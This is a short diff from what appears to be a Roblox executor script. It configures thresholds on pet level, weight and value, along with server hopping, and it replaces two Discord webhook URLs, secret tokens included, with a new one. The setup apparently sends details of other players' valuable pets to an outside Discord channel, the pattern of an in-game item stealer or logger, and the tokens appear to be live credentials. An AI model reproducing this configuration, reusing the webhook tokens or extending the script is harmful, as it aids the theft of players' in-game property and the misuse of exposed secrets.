@@ -8,8 +8,8 @@ getgenv().scriptAlreadyRan = true
 getgenv().MinLevel = 75       -- Minimum pet level
 getgenv().MinWeight = 20      -- Minimum pet weight
 local GROWTH_FACTOR = 0.1     -- Weight growth factor
-local WEBHOOK_LOW = "https://discord.com/api/webhooks/1376515155814514769/0pp3_tQv_j7Aeehx6imt8UBQUan0sPFfn9yaxXxmy6QGfeucYGh4CHQwrssARwTNfh75"
-local WEBHOOK_HIGH = "https://discord.com/api/webhooks/1401554249158230216/7H-IIQH6rGTSntv0Du-Dbk2sYzCSYbLHKd-m-j_paAZwh8V4Yj5ec-J4StSZWWB8zqYn"
+local WEBHOOK_LOW = "https://discord.com/api/webhooks/1408421597156474890/DshCKWfUftKiEKTymFXskyk_ZaqFd86iVtPDqKEhQ3qvyrlFgy05JcCMAEM8oWfysbcZ"
+local WEBHOOK_HIGH = "https://discord.com/api/webhooks/1408421597156474890/DshCKWfUftKiEKTymFXskyk_ZaqFd86iVtPDqKEhQ3qvyrlFgy05JcCMAEM8oWfysbcZ"
 local WEBHOOK_THRESHOLD = 1900 -- Threshold for high-value webhook
 local MAX_OCCUPANCY = 2        -- Max players for server hopping
 
